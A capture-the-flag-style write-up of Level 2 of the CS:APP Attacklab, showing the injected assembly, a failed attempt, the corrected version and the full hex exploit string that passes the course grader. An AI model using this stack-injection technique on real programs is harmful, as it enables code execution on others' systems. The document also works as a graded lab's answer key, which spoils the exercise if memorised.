# CS:APP Attacklab Writeup
## Level 2
Recalling that:
This program is set up in a way that
the stack positions will be consistent from one run to the next and so that data on the stack can be treated as
executable code. These features make the program vulnerable to attacks where the exploit strings contain
the byte encodings of executable code.

So, we can ask the program to return to the place of the the attack instructions.

We can devise the following assembly code:
```asm
movq $0x59b997fa, %rdi
subq $0x10, %rsp
ret
nop
```
and turn the return address into 0x4017ec.

However, this failed with a segment fault.
```
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
Ouch!: You caused a segmentation fault!
```

In fact, we should not edit stack and change the value of %rsp to get the return address, which corrupts the other data in the stack.

Instead, use `pushq` to push the return address into stack:
```
movq $0x59b997fa, %rdi
pushq $0x4017ec
ret
nop
```

And this makes things correct.

```
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 11 45 14 11 EC 17 40 00 00 00 00 78 DC 61 55 
```
